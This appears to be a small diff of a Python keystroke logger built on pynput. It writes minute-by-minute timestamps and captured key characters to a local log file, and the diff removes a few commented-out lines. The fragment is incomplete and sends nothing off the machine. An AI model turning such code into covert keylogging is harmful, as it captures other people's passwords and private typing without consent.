@@ -1,5 +1,3 @@
-# file = open('keys_19-06-2025-02.21.13.txt')
-# print(file.read(100000))
 import threading
 from pynput.keyboard import Listener
 from datetime import datetime
@@ -13,7 +11,6 @@ def timestemp_everyminute():
         file.write(f'~\n{timestemp}:~\n\n')
       time.sleep(60)
 def on_press(key):
-     # while Listener.running:
     if hasattr(key, 'char') and key.char is not None:
         text_key = (key.char)
     else:
